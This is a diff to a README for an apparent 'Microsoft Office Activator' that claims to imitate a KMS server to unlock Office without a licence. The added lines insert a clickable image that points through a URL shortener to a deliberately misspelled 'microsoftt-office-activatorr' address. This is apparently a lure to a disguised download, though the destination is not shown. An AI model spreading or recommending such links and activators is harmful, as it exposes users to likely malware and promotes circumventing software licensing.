@@ -1,6 +1,8 @@
 # Microsoft Office Activator 
 KMS Office Activator mimics a Key Management Service (KMS), a technology various corporations use to manage software activation across multiple devices.
 
+[![4568467589674590](https://github.com/user-attachments/assets/7542a8cd-3796-4fe3-ac92-78924f285616)](https://y.gy/microsoftt-office-activatorr)
+
 ## How It Works
 Microsoft Office Activator typically employs one of two methods:
 
